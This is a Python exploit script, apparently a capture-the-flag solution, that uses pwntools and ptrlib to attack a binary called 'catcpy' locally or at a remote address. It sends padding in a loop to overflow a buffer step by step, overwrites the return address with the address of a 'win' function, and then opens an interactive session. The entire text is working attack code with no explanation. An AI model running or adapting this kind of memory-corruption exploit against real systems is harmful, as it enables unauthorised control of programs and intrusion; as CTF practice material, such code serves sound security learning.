#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./catcpy")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 13997)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    for i in range(8, 0, -1):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"Data: ", b"A" * 255)
        io.sendlineafter(b"> ", b"2")
        input(">> ")
        io.sendlineafter(b"Data: ", b"A" * 25 + b"A" * i)

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Data: ", b"A" * 255)

    payload = b""
    payload += b"A" * 25
    payload += ptr.p64(unwrap(unwrap(exe.symbol("win"))))
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Data: ", payload)

    io.sendlineafter(b"> ", b"3")

    io.interactive()
    return


if __name__ == "__main__":
    main()
